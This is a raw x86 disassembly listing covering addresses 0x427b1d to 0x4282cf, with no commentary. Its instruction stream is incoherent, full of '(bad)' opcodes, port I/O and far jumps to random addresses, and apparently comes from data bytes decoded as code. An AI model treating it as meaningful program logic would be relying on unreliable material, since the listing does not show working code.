  427b1d:	push   cs
  427b1e:	mov    al,0x18
  427b20:	mov    al,0xc4
  427b22:	jle    0x427b99
  427b24:	cmp    ax,0xe710
  427b28:	retf   
  427b29:	cli    
  427b2a:	por    mm0,QWORD PTR [edi+0x69d59ab2]
  427b31:	dec    ebx
  427b32:	adc    dl,BYTE PTR [eax+edx*4]
  427b35:	stos   BYTE PTR es:[edi],al
  427b36:	fmul   QWORD PTR [eax]
  427b39:	std    
  427b3a:	xchg   ebx,eax
  427b3b:	adc    eax,0x7124363c
  427b40:	xor    ch,ch
  427b42:	add    DWORD PTR [edx+eiz*8-0x4d41665b],eax
  427b49:	shl    ah,1
  427b4b:	outs   dx,DWORD PTR ds:[esi]
  427b4c:	inc    ebx
  427b4d:	xchg   DWORD PTR ds:0x7f173751,esi
  427b53:	dec    edi
  427b54:	or     cl,BYTE PTR [ebx-0x30da4bc9]
  427b5a:	push   esi
  427b5b:	cmc    
  427b5c:	mov    dl,0xbf
  427b5e:	mov    dh,0x82
  427b60:	in     eax,dx
  427b61:	mov    ds:0xb307617,eax
  427b66:	add    dh,BYTE PTR [edi+0x71062560]
  427b6c:	ret    0x6880
  427b6f:	dec    edx
  427b70:	mov    dl,0x2f
  427b72:	ins    BYTE PTR es:[edi],dx
  427b73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b74:	cmp    al,dh
  427b76:	jae    0x427bc7
  427b78:	push   edi
  427b79:	or     ebx,DWORD PTR [edx-0x74]
  427b7c:	(bad)  
  427b7d:	in     eax,0xe4
  427b7f:	test   DWORD PTR [eax+0xf389da9],0x727b071c
  427b89:	test   al,0xfe
  427b8b:	sbb    DWORD PTR [ebx+ecx*1-0x3e],ecx
  427b8f:	pop    edx
  427b90:	xchg   esi,edi
  427b92:	rcl    BYTE PTR [eax+0x6f],1
  427b95:	cli    
  427b96:	call   0x3b3e:0xd665e188
  427b9d:	inc    ebp
  427b9e:	inc    ebx
  427b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427ba0:	pop    ebp
  427ba1:	repnz pushf 
  427ba3:	xchg   esi,eax
  427ba4:	xchg   ebx,eax
  427ba5:	jbe    0x427c09
  427ba7:	rcr    BYTE PTR [edx-0x47],cl
  427baa:	in     eax,0xb1
  427bac:	mov    dl,0x55
  427bae:	in     eax,0x87
  427bb0:	pop    ss
  427bb1:	in     eax,0x4b
  427bb3:	pop    ebx
  427bb4:	xchg   DWORD PTR [ecx],ecx
  427bb6:	xchg   esp,eax
  427bb7:	nop
  427bb8:	retf   
  427bb9:	iret   
  427bba:	ja     0x427c26
  427bbc:	inc    edi
  427bbd:	jmp    0x427b87
  427bbf:	xchg   ebx,eax
  427bc0:	pop    eax
  427bc1:	or     eax,eax
  427bc3:	(bad)  [esi+edi*4]
  427bc6:	pop    ebx
  427bc7:	mov    WORD PTR [ecx+0x7e599d8a],ss
  427bcd:	test   al,0x67
  427bcf:	inc    ebx
  427bd0:	add    bh,BYTE PTR [edi+0x7c]
  427bd3:	xchg   ebp,eax
  427bd4:	mov    eax,ds:0xfff7be15
  427bd9:	or     cl,bh
  427bdb:	xor    bl,ch
  427bdd:	pushf  
  427bde:	adc    eax,0x28794d97
  427be3:	ror    DWORD PTR [ebp-0x6586e69],1
  427be9:	and    esp,DWORD PTR [esi]
  427beb:	cmp    DWORD PTR [esi-0x65],ebx
  427bee:	pop    ss
  427bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bf0:	mov    esp,0x69a614b2
  427bf5:	dec    edx
  427bf6:	popa   
  427bf7:	mov    bl,0xb2
  427bf9:	not    eax
  427bfb:	mov    eax,ds:0x836e1364
  427c00:	sbb    BYTE PTR ds:0x4c6cd46c,al
  427c06:	fist   DWORD PTR [ebx]
  427c08:	push   ebp
  427c09:	shl    bh,0x59
  427c0c:	inc    ebp
  427c0d:	mov    edx,ds
  427c0f:	mov    esi,0x327eb4e2
  427c14:	pop    esp
  427c15:	or     edx,DWORD PTR [eax-0x2aaf0ddd]
  427c1b:	popa   
  427c1c:	cmp    eax,DWORD PTR [esi]
  427c1e:	call   0x656a:0x27337db
  427c25:	sbb    BYTE PTR [esi],dh
  427c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c28:	push   es
  427c29:	je     0x427c76
  427c2b:	inc    ebp
  427c2c:	jmp    0x427c86
  427c2e:	mov    ds:0x905cb2b2,al
  427c33:	inc    eax
  427c34:	aad    0xc5
  427c36:	les    ebp,FWORD PTR [eax-0x16]
  427c39:	mov    ebx,0x31845df1
  427c3e:	inc    ecx
  427c3f:	cmp    eax,0xdab29732
  427c44:	pop    esi
  427c45:	retf   0x44b8
  427c48:	mov    cl,0xed
  427c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c4b:	adc    dh,0xbc
  427c4e:	add    eax,DWORD PTR [edi]
  427c50:	jecxz  0x427bd7
  427c52:	int    0xa7
  427c54:	sbb    al,0xfa
  427c56:	sbb    al,cl
  427c58:	loope  0x427c2e
  427c5a:	dec    edx
  427c5b:	push   ss
  427c5c:	mov    dl,0x82
  427c5e:	jnp    0x427c0c
  427c60:	fwait
  427c61:	pushf  
  427c62:	mov    al,ds:0x12052a3d
  427c67:	mov    ah,0x4c
  427c69:	cmp    ebx,DWORD PTR [edx-0x20]
  427c6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c6d:	push   0xc8b2e5bd
  427c72:	push   eax
  427c73:	rcr    DWORD PTR [edi],cl
  427c75:	jbe    0x427cd5
  427c77:	inc    esp
  427c78:	mov    DWORD PTR [ebx],ecx
  427c7a:	mov    esp,0x4d0c4c60
  427c7f:	js     0x427c8b
  427c81:	inc    ecx
  427c82:	in     al,0x1e
  427c84:	mov    eax,0xf769ca8f
  427c89:	rcr    DWORD PTR [edx+0x7037bfe0],1
  427c8f:	inc    ecx
  427c90:	sbb    BYTE PTR [ebx+esi*4],al
  427c93:	cwde   
  427c94:	ror    DWORD PTR [edx-0x25],0x63
  427c98:	mov    al,dl
  427c9a:	loope  0x427d17
  427c9c:	js     0x427c70
  427c9e:	in     eax,dx
  427c9f:	xor    BYTE PTR [edx+0x7f1f5b7f],dh
  427ca5:	mov    BYTE PTR [ebp+edx*2-0x44],ah
  427ca9:	or     esp,DWORD PTR [ebx+eiz*8]
  427cac:	push   ebx
  427cad:	cwde   
  427cae:	cmp    eax,0x8580ac02
  427cb3:	leave  
  427cb4:	pop    ecx
  427cb5:	aam    0xda
  427cb7:	jp     0x427d2d
  427cb9:	mov    ecx,0x16a61bd1
  427cbe:	sbb    dl,BYTE PTR [ecx+0x29b0c8ca]
  427cc4:	fucomp st(2)
  427cc6:	sub    ch,cl
  427cc8:	xchg   edx,eax
  427cc9:	add    ebx,DWORD PTR [edx-0x15a97f1c]
  427ccf:	mov    DWORD PTR [ebx],edi
  427cd1:	push   0x28
  427cd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cd4:	std    
  427cd5:	es call FWORD PTR ss:[edx]
  427cd9:	add    dh,ah
  427cdb:	mov    ds:0x35be62b3,eax
  427ce0:	ret    0xef70
  427ce3:	js     0x427ca7
  427ce5:	sbb    al,0xd8
  427ce7:	sar    DWORD PTR [ecx],1
  427ce9:	jnp    0x427c7d
  427ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cec:	sbb    ebx,ebp
  427cee:	pop    es
  427cef:	inc    DWORD PTR [edx]
  427cf1:	jb     0x427d6f
  427cf3:	push   es
  427cf4:	mov    dl,0x73
  427cf6:	leave  
  427cf7:	popf   
  427cf8:	mov    DWORD PTR [esi],edx
  427cfa:	cmp    DWORD PTR [edi+0x7e080bee],ecx
  427d00:	push   ebp
  427d01:	pop    esi
  427d02:	push   edx
  427d03:	xchg   ecx,eax
  427d04:	(bad)  
  427d05:	jb     0x427ca1
  427d07:	pop    ss
  427d08:	ss cmp al,0xfc
  427d0b:	cmp    al,0x77
  427d0d:	add    cl,al
  427d0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d10:	push   eax
  427d11:	cwde   
  427d12:	and    bl,bh
  427d14:	stos   BYTE PTR es:[edi],al
  427d15:	stos   DWORD PTR es:[edi],eax
  427d16:	jnp    0x427d86
  427d18:	(bad)  
  427d19:	shr    BYTE PTR [ebp+0x27],1
  427d1c:	mov    esi,0x51e24401
  427d21:	jnp    0x427d8b
  427d23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d24:	dec    esi
  427d25:	cwde   
  427d26:	pop    ebx
  427d27:	stc    
  427d28:	pop    ebx
  427d29:	push   es
  427d2a:	mov    dl,0x7e
  427d2c:	mov    dl,0x44
  427d2e:	or     BYTE PTR [esi+eax*1],ah
  427d31:	sub    ch,0x12
  427d34:	(bad)  
  427d35:	jmp    0x4d32500
  427d3a:	pop    esi
  427d3b:	mov    al,0x6d
  427d3d:	pop    esp
  427d3e:	or     BYTE PTR [esi],0xbb
  427d41:	jp     0x427d39
  427d43:	mov    ah,BYTE PTR [ebx+0x2e548c8b]
  427d49:	mov    dl,0x76
  427d4b:	aaa    
  427d4c:	or     eax,0x6b465d0b
  427d51:	push   edx
  427d52:	stos   BYTE PTR es:[edi],al
  427d53:	jmp    0xb5dd2a8a
  427d58:	dec    edi
  427d59:	mov    ebp,DWORD PTR fs:[esi-0x20]
  427d5d:	sahf   
  427d5e:	aas    
  427d5f:	aas    
  427d60:	fsub   DWORD PTR ds:0x8740c35
  427d66:	mov    ecx,ss
  427d68:	pmullw mm0,QWORD PTR [edi]
  427d6b:	daa    
  427d6c:	fcmovnu st,st(1)
  427d6e:	sub    edx,DWORD PTR [ebp+0x54]
  427d71:	stos   BYTE PTR es:[edi],al
  427d72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d73:	retf   
  427d74:	ja     0x427d23
  427d76:	in     eax,dx
  427d77:	lea    esi,[edx+0x5f3dbba2]
  427d7d:	mov    ebx,fs
  427d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d80:	fcmovb st,st(5)
  427d82:	xchg   ebp,ecx
  427d84:	and    bh,BYTE PTR [edi]
  427d86:	mov    ah,dl
  427d88:	shr    DWORD PTR [edi-0x1d7498f6],0x4d
  427d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d90:	pop    ecx
  427d91:	mov    ebx,0xeec4505b
  427d96:	aas    
  427d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d98:	adc    DWORD PTR [esi-0x33804908],ecx
  427d9e:	mov    al,ds:0x9ab25413
  427da3:	je     0x427e16
  427da5:	jae    0x427d7e
  427da7:	clc    
  427da8:	pop    ecx
  427da9:	adc    al,0xc
  427dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dac:	mov    esp,0x97a00be3
  427db1:	loope  0x427d7b
  427db3:	shl    BYTE PTR [edx+0x263b39bd],1
  427db9:	push   cs
  427dba:	arpl   WORD PTR [esi],bp
  427dbc:	sbb    BYTE PTR [ebp+0x4c],bh
  427dbf:	xlat   BYTE PTR ds:[ebx]
  427dc0:	lahf   
  427dc1:	or     ecx,ebx
  427dc3:	into   
  427dc4:	aam    0x72
  427dc6:	daa    
  427dc7:	mov    ecx,0xff9a6a68
  427dcc:	outs   dx,BYTE PTR ds:[esi]
  427dcd:	cmp    eax,0x71a0a14e
  427dd2:	xor    BYTE PTR [edi],dl
  427dd4:	pop    ebx
  427dd5:	or     ebx,DWORD PTR [edx+0x77]
  427dd8:	adc    eax,0xff2d970e
  427ddd:	ins    DWORD PTR es:[edi],dx
  427dde:	call   0x4b09:0x8e768766
  427de5:	shr    BYTE PTR gs:[ecx-0x2a4d9497],0x72
  427ded:	aam    0xae
  427def:	fmul   QWORD PTR [edx-0x2c376a18]
  427df5:	ja     0x427e18
  427df7:	addr16 xor eax,0x20fed385
  427dfd:	or     esi,esi
  427dff:	fidivr WORD PTR ds:0x2d398aaf
  427e05:	sbb    eax,0x6ba1a9a
  427e0a:	inc    eax
  427e0b:	outs   dx,DWORD PTR ds:[esi]
  427e0c:	dec    edi
  427e0d:	or     edx,edx
  427e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e10:	cmp    ebp,0x54f5fb7f
  427e16:	push   es
  427e17:	dec    ebp
  427e18:	scas   al,BYTE PTR es:[edi]
  427e19:	aaa    
  427e1a:	mov    edi,0x8a9bb2bd
  427e1f:	push   edi
  427e20:	push   edx
  427e21:	cdq    
  427e22:	cmp    ah,BYTE PTR [eax+0x2f389ec7]
  427e28:	scas   al,BYTE PTR es:[edi]
  427e29:	or     eax,DWORD PTR [ecx-0x65190e93]
  427e2f:	mov    WORD PTR [ebp-0x2c],cs
  427e32:	rcr    esp,cl
  427e34:	loop   0x427e1a
  427e36:	jge    0x427ddd
  427e38:	sub    DWORD PTR [ebx-0x57],edi
  427e3b:	pop    ecx
  427e3c:	push   0x13475ad7
  427e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e42:	call   0xaad6:0x3ccd9005
  427e49:	mov    BYTE PTR fs:[eax+0x391af866],bl
  427e50:	lock add dh,BYTE PTR ds:0x9a48bd6a
  427e57:	jmp    0x66d4b770
  427e5c:	cs pop edx
  427e5e:	mov    esi,0x62afceac
  427e63:	jns    0x427e1c
  427e65:	fld    DWORD PTR [ebx-0x15301899]
  427e6b:	sub    BYTE PTR [eax+eax*2-0x49cd7144],ch
  427e72:	enter  0x3e2c,0x3c
  427e76:	or     eax,0x94e34dd5
  427e7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e7c:	test   al,0x5b
  427e7e:	cld    
  427e7f:	mov    al,ds:0x7359bba3
  427e84:	mov    dl,0x0
  427e86:	shr    ch,cl
  427e88:	lods   eax,DWORD PTR ds:[esi]
  427e89:	cmp    eax,0x7cff903e
  427e8e:	test   BYTE PTR [edi+0x41cd9e13],ah
  427e94:	retf   0x888c
  427e97:	test   eax,0x6a80acb2
  427e9c:	add    ebp,DWORD PTR [esi+0x7e34e15d]
  427ea2:	pushf  
  427ea3:	rol    BYTE PTR ds:0x97188219,cl
  427ea9:	pop    ds
  427eaa:	cmp    eax,0x636d9e4e
  427eaf:	mov    ebx,0xccf5cbcb
  427eb4:	mov    esi,0xb207d74e
  427eb9:	cs les esp,FWORD PTR cs:[ecx+eax*4-0x2]
  427ebf:	out    dx,al
  427ec0:	and    eax,0xa7b6700c
  427ec5:	sub    dh,bl
  427ec7:	push   edi
  427ec8:	mov    dh,0xfc
  427eca:	and    DWORD PTR [eax-0x5833cd06],ebx
  427ed0:	inc    edx
  427ed1:	pop    ebx
  427ed2:	mov    esp,0xd5c29965
  427ed7:	pop    edi
  427ed8:	test   DWORD PTR [eax],ecx
  427eda:	shr    dh,1
  427edc:	aaa    
  427edd:	pusha  
  427ede:	pop    edx
  427edf:	je     0x427ef2
  427ee1:	daa    
  427ee2:	sbb    bh,BYTE PTR [edx]
  427ee4:	dec    ebp
  427ee5:	fs call 0x4735:0xd8dfdc00
  427eed:	pop    ds
  427eee:	xchg   esi,eax
  427eef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ef0:	jmp    0x59fc:0x11e9759e
  427ef7:	sub    eax,0x814fa1b7
  427efc:	mov    BYTE PTR [edx+ebx*2+0x30],0xb
  427f01:	xor    bl,BYTE PTR [ebx]
  427f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f04:	out    0xf2,eax
  427f06:	test   eax,0x9f236b77
  427f0b:	addr16 mov dl,0xaa
  427f0e:	mov    esi,0x29e7d48b
  427f13:	mov    al,0xa4
  427f15:	or     ebp,DWORD PTR [edi]
  427f17:	in     al,dx
  427f18:	fsubr  QWORD PTR [esi-0xe]
  427f1b:	ret    
  427f1c:	jmp    0x7eab:0x24a49a64
  427f23:	pop    edi
  427f24:	xchg   esp,eax
  427f25:	inc    esp
  427f26:	stc    
  427f27:	mov    ebx,0x27a31100
  427f2c:	jp     0x427eb3
  427f2e:	cmp    esp,DWORD PTR [edx+0x56ef358a]
  427f34:	mov    dl,0x56
  427f36:	sar    BYTE PTR [edx],1
  427f38:	lods   al,BYTE PTR ds:[esi]
  427f39:	push   es
  427f3a:	outs   dx,DWORD PTR ds:[esi]
  427f3b:	xchg   esi,eax
  427f3c:	scas   al,BYTE PTR es:[edi]
  427f3d:	xor    BYTE PTR [edi],ah
  427f3f:	test   al,0x8d
  427f41:	loopne 0x427f5d
  427f43:	mov    al,ds:0xcb8c8efa
  427f48:	cmp    DWORD PTR ds:0x18ab3595,0x196767fe
  427f52:	sar    DWORD PTR [ebx],cl
  427f54:	ret    0x230b
  427f57:	push   ebx
  427f58:	xor    cl,BYTE PTR [eax+0x19]
  427f5b:	inc    eax
  427f5c:	out    0xf5,al
  427f5e:	popf   
  427f5f:	test   DWORD PTR [eax+0x56],edx
  427f62:	ror    DWORD PTR ds:0x719acdb8,0xac
  427f69:	(bad)  
  427f6a:	jle    0x427f01
  427f6c:	or     BYTE PTR [ebx],0x5a
  427f6f:	mov    ebp,0x8eb16b14
  427f74:	sub    ah,ah
  427f76:	call   0xfe49:0x5ca942c5
  427f7d:	cmp    bh,cl
  427f7f:	mov    al,ds:0xe766cf4f
  427f84:	add    cl,BYTE PTR [ebx-0x18f3e36f]
  427f8a:	cwde   
  427f8b:	xor    DWORD PTR [edi+0x3],ebp
  427f8e:	mov    eax,ds:0x5a7e61b1
  427f93:	cdq    
  427f94:	ins    DWORD PTR es:[edi],dx
  427f95:	mov    BYTE PTR [edx-0x3fce83bc],bl
  427f9b:	in     al,dx
  427f9c:	mov    bl,0xe3
  427f9e:	and    BYTE PTR [edi+0x13be561b],bl
  427fa4:	jge    0x427fb1
  427fa6:	push   eax
  427fa7:	push   0xffffff8e
  427fa9:	adc    bh,BYTE PTR [ecx+0x4d]
  427fac:	mov    cl,0xb3
  427fae:	mov    al,ds:0x550ddcdb
  427fb3:	pusha  
  427fb4:	adc    bl,BYTE PTR [edi-0x3d]
  427fb7:	xor    DWORD PTR [edx+0xb],ebp
  427fba:	mov    edx,0xb8f72eff
  427fbf:	xlat   BYTE PTR ds:[ebx]
  427fc0:	dec    eax
  427fc1:	mov    ecx,0x591839a
  427fc6:	dec    esp
  427fc7:	out    0xcf,al
  427fc9:	lahf   
  427fca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fcb:	pop    ds
  427fcc:	test   DWORD PTR [ebx],0x8377bc26
  427fd2:	(bad)  
  427fd3:	mov    ebx,0x9d9a1527
  427fd8:	jmp    0x7a9caa05
  427fdd:	pushf  
  427fde:	inc    eax
  427fdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427fe0:	mov    edx,0xc4675578
  427fe5:	shr    BYTE PTR [eax-0x4d],cl
  427fe8:	mov    dl,0x98
  427fea:	gs das 
  427fec:	push   es
  427fed:	push   ebx
  427fee:	dec    esp
  427fef:	mov    al,ds:0x57560b04
  427ff4:	sbb    BYTE PTR [eax+0x7f],bh
  427ff7:	pop    esi
  427ff8:	and    ch,BYTE PTR [esi-0x66]
  427ffb:	cld    
  427ffc:	sbb    al,0x77
  427ffe:	gs and eax,0xa7afae69
  428004:	leave  
  428005:	int    0xf0
  428007:	xor    eax,0x470bce6c
  42800c:	mov    cl,0x41
  42800e:	into   
  42800f:	outs   dx,BYTE PTR ds:[esi]
  428010:	data16 fnclex 
  428013:	dec    edi
  428014:	xor    al,0x86
  428016:	ret    0xefa7
  428019:	js     0x427fbb
  42801b:	jb     0x42801f
  42801d:	pop    ss
  42801e:	test   al,0xe4
  428020:	lds    edx,FWORD PTR [ecx+0x4a20f39b]
  428026:	or     eax,0xb02a3a15
  42802b:	pop    ss
  42802c:	cwde   
  42802d:	pop    es
  42802e:	cdq    
  42802f:	jmp    0x42baa501
  428034:	ret    
  428035:	mov    ds:0xb6ffaf3,eax
  42803a:	or     al,0x6e
  42803c:	push   ecx
  42803d:	into   
  42803e:	sbb    BYTE PTR [eax],bl
  428040:	mov    eax,ds:0xb5107a90
  428045:	jle    0x42806f
  428047:	mov    dl,BYTE PTR [eax-0x7e]
  42804a:	xchg   ebx,eax
  42804b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42804c:	test   dl,0x5
  42804f:	sbb    al,0x3e
  428051:	or     ebx,DWORD PTR [ebp-0xc]
  428054:	mov    esp,0x9801d21c
  428059:	dec    esp
  42805a:	sub    dh,BYTE PTR [edx+esi*4+0x62]
  42805e:	lds    eax,FWORD PTR [ecx-0x5d]
  428061:	js     0x428080
  428063:	nop
  428064:	cmp    BYTE PTR [ebx],cl
  428066:	in     al,dx
  428067:	pop    dx
  428069:	add    ebp,DWORD PTR [eax]
  42806b:	or     edi,DWORD PTR [edx-0x2]
  42806e:	call   0x4e23:0xd77710f3
  428075:	sub    dh,BYTE PTR [ecx-0x59]
  428078:	fiadd  DWORD PTR gs:[edi+0x3]
  42807c:	sub    ecx,esi
  42807e:	hlt    
  42807f:	mov    bh,0xbc
  428081:	mov    edi,0x349d0c0b
  428086:	call   0x3108:0x1b74f135
  42808d:	sbb    DWORD PTR [eax],esi
  42808f:	aas    
  428090:	push   ebx
  428091:	or     edi,edi
  428093:	push   ebp
  428094:	fidivr WORD PTR [ecx]
  428096:	push   0xffffffa4
  428098:	dec    esi
  428099:	stos   DWORD PTR es:[edi],eax
  42809a:	call   0xf92d:0xe6a6a8f2
  4280a1:	leave  
  4280a2:	enter  0x14a7,0xed
  4280a6:	and    ebx,DWORD PTR [edi+0x18]
  4280a9:	sub    BYTE PTR [edi-0x42aa7788],0xa6
  4280b0:	inc    esp
  4280b1:	xchg   BYTE PTR [ebp+0x42f05f67],bl
  4280b7:	test   DWORD PTR [ebp+0x14],edx
  4280ba:	dec    edx
  4280bb:	arpl   WORD PTR [ecx+0x2f1e810a],bx
  4280c1:	mov    DWORD PTR [esi],esp
  4280c3:	xchg   edi,eax
  4280c4:	pop    edx
  4280c5:	mov    ds:0xe68a579a,eax
  4280ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280cb:	xor    dl,ch
  4280cd:	enter  0xa7cc,0xf5
  4280d1:	adc    eax,0xdbafae71
  4280d6:	fstp   TBYTE PTR [esi]
  4280d8:	mov    dl,0xdc
  4280da:	hlt    
  4280db:	adc    al,0x41
  4280dd:	xor    BYTE PTR [edx],cl
  4280df:	jb     0x42812d
  4280e1:	or     eax,DWORD PTR [esi+0x3b498b0a]
  4280e7:	pop    ds
  4280e8:	push   ss
  4280e9:	jnp    0x428071
  4280eb:	mov    BYTE PTR [edi-0x46ba0f0],dl
  4280f1:	sahf   
  4280f2:	sbb    ch,BYTE PTR [esi+ebx*2+0x66a7cd65]
  4280f9:	lock push ds
  4280fb:	mov    WORD PTR [eax-0x80],fs
  4280fe:	pop    ecx
  4280ff:	and    DWORD PTR [esi+0x1c27aff3],ecx
  428105:	sub    BYTE PTR [eax],dl
  428107:	(bad)  
  428108:	pop    edi
  428109:	loope  0x4280d9
  42810b:	sahf   
  42810c:	aam    0x8e
  42810e:	sbb    cl,al
  428110:	xor    BYTE PTR [edx+0x60673d76],bh
  428116:	call   0x82d0:0xc78bae74
  42811d:	mov    bl,BYTE PTR [ecx-0x59]
  428120:	stc    
  428121:	in     eax,0x3b
  428123:	adc    eax,0x343a76e9
  428128:	mov    dl,0x60
  42812a:	cmp    BYTE PTR [ecx+0xd],0x9f
  42812e:	cmp    DWORD PTR [ebx+0x6f],ebx
  428131:	or     edx,DWORD PTR [edi-0x4e09224d]
  428137:	in     eax,0x83
  428139:	mov    bh,0x9a
  42813b:	dec    ebp
  42813c:	stos   DWORD PTR es:[edi],eax
  42813d:	out    dx,al
  42813e:	dec    ebp
  42813f:	mov    ds:0x8b43c846,eax
  428144:	cld    
  428145:	push   esi
  428146:	and    al,0xa7
  428148:	aas    
  428149:	inc    esp
  42814a:	inc    ecx
  42814b:	leave  
  42814c:	and    BYTE PTR [ebp-0x66],cl
  42814f:	stc    
  428150:	ret    0xb117
  428153:	outs   dx,DWORD PTR ds:[esi]
  428154:	add    al,0x53
  428156:	cmp    bh,BYTE PTR [eax+0x27aaf246]
  42815c:	imul   edx,DWORD PTR [ecx+0x36],0x49
  428160:	rcl    DWORD PTR [ecx+ecx*4+0x2a],1
  428164:	mov    edi,gs
  428166:	call   0xe9d3:0xfa3655c9
  42816d:	or     ecx,edx
  42816f:	fist   DWORD PTR [ebx]
  428171:	call   0x70a2:0xeb34afc
  428178:	jmp    0xaf11:0xd09d20b
  42817f:	stos   BYTE PTR es:[edi],al
  428180:	jge    0x42818d
  428182:	and    ch,BYTE PTR [esi]
  428184:	bnd call 0xc74b60f2
  42818a:	in     eax,0xd8
  42818c:	mov    dl,0xf1
  42818e:	ins    BYTE PTR es:[edi],dx
  42818f:	fwait
  428190:	mov    eax,0x2b844d3f
  428195:	or     esp,DWORD PTR [ecx+0x33]
  428198:	sbb    ebp,ebx
  42819a:	mov    dl,0xc9
  42819c:	mov    WORD PTR [edx+ebx*4],ds
  42819f:	bound  edx,QWORD PTR [edi+esi*1-0x1ff3715]
  4281a6:	mov    esi,0x8a9e6ba4
  4281ab:	mov    ds:0x6456f343,eax
  4281b0:	xchg   esi,eax
  4281b1:	adc    BYTE PTR [edx],0x5e
  4281b4:	mov    ah,0xaf
  4281b6:	cdq    
  4281b7:	cmp    al,0xc9
  4281b9:	inc    esp
  4281ba:	repz jp 0x42817f
  4281bd:	fwait
  4281be:	or     BYTE PTR [edi-0x731df4a8],al
  4281c4:	cmp    DWORD PTR [ecx-0x6318f55c],esi
  4281ca:	cdq    
  4281cb:	leave  
  4281cc:	mov    esi,0x2fdf7b3
  4281d1:	jmp    0x428239
  4281d3:	sbb    al,0xed
  4281d5:	or     eax,DWORD PTR [eax]
  4281d7:	out    dx,al
  4281d8:	add    eax,0x7eb6c9d0
  4281dd:	add    eax,0x3f51589a
  4281e2:	rol    DWORD PTR [ecx-0x5fa2b118],0x31
  4281e9:	mov    eax,0x8bf2eda7
  4281ee:	mov    edx,DWORD PTR [esi-0x28]
  4281f1:	adc    BYTE PTR [edx-0x5638d4f9],bl
  4281f7:	inc    edx
  4281f8:	sub    BYTE PTR cs:[esi],bl
  4281fb:	mov    al,0x6
  4281fd:	ret    
  4281fe:	cmp    DWORD PTR [edi-0x5d19df78],esp
  428204:	aad    0x50
  428206:	fwait
  428207:	call   0x6a432c4a
  42820c:	(bad)  
  42820d:	adc    bh,BYTE PTR [edx-0x7bf7ade9]
  428213:	xor    bh,ch
  428215:	cli    
  428216:	fs inc eax
  428218:	pop    ecx
  428219:	lea    edi,[edx]
  42821b:	push   0xe66e87a5
  428220:	mov    bl,0x7
  428222:	xchg   BYTE PTR ds:[edi-0x4f],dh
  428226:	arpl   WORD PTR [esi+0x66],bp
  428229:	mov    dh,dl
  42822b:	sti    
  42822c:	jle    0x428287
  42822e:	rcl    BYTE PTR ds:0x768afdb3,cl
  428234:	dec    ecx
  428235:	js     0x42823e
  428237:	xchg   edi,eax
  428238:	stos   BYTE PTR es:[edi],al
  428239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42823a:	xchg   BYTE PTR [ebx+0x19],al
  42823d:	inc    esi
  42823e:	pop    edx
  42823f:	mov    gs,WORD PTR [edi-0x2ad3c97f]
  428245:	or     esp,DWORD PTR [esi]
  428247:	push   ecx
  428248:	jecxz  0x428215
  42824a:	aad    0x9d
  42824c:	dec    ecx
  42824d:	and    DWORD PTR [edx+0x14dc1978],ebx
  428253:	push   esp
  428254:	imul   ecx,DWORD PTR [ebp-0x42],0xe2473681
  42825b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42825c:	lods   al,BYTE PTR ds:[esi]
  42825d:	outs   dx,DWORD PTR ds:[esi]
  42825e:	sub    al,ch
  428260:	cmp    edi,esp
  428262:	sbb    ecx,edi
  428264:	mov    dl,0x7e
  428266:	pop    ss
  428267:	popf   
  428268:	not    DWORD PTR [edi-0x6a]
  42826b:	gs pop esi
  42826d:	adc    al,0xf5
  42826f:	add    al,0xa1
  428271:	mov    ecx,DWORD PTR [edx+ebx*8-0x6f22ec2a]
  428278:	mov    dl,0x88
  42827a:	xor    DWORD PTR [edi+0x65c42399],edx
  428280:	or     DWORD PTR [ebx],0xffffff9e
  428283:	dec    edi
  428284:	pop    esp
  428285:	in     al,0x93
  428287:	mov    ecx,0x948c0df4
  42828c:	xchg   edx,eax
  42828d:	sbb    ah,BYTE PTR [edi+eiz*4]
  428290:	loope  0x42822f
  428292:	push   ebp
  428293:	jmp    0x34e0025b
  428298:	sub    al,0xdf
  42829a:	adc    eax,esi
  42829c:	inc    edx
  42829d:	sbb    al,0x73
  42829f:	je     0x428225
  4282a1:	or     ecx,DWORD PTR [ebx]
  4282a3:	es enter 0x90bd,0x8b
  4282a8:	push   ss
  4282a9:	out    dx,eax
  4282aa:	call   0xdc08:0x38daff15
  4282b1:	inc    eax
  4282b2:	push   cs
  4282b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282b4:	ss int 0x15
  4282b7:	and    al,0x8
  4282b9:	and    al,0x71
  4282bb:	adc    DWORD PTR [edx],edi
  4282bd:	pusha  
  4282be:	lods   eax,DWORD PTR ds:[esi]
  4282bf:	fdiv   QWORD PTR [ebx-0x71c2af17]
  4282c5:	pop    ebp
  4282c6:	nop
  4282c7:	push   ss
  4282c8:	outs   dx,BYTE PTR ds:[esi]
  4282c9:	data16 je 0x428273
  4282cc:	fucomp st(5)
  4282ce:	dec    edx
  4282cf:	shr    BYTE PTR [esi-0x21],0x2e
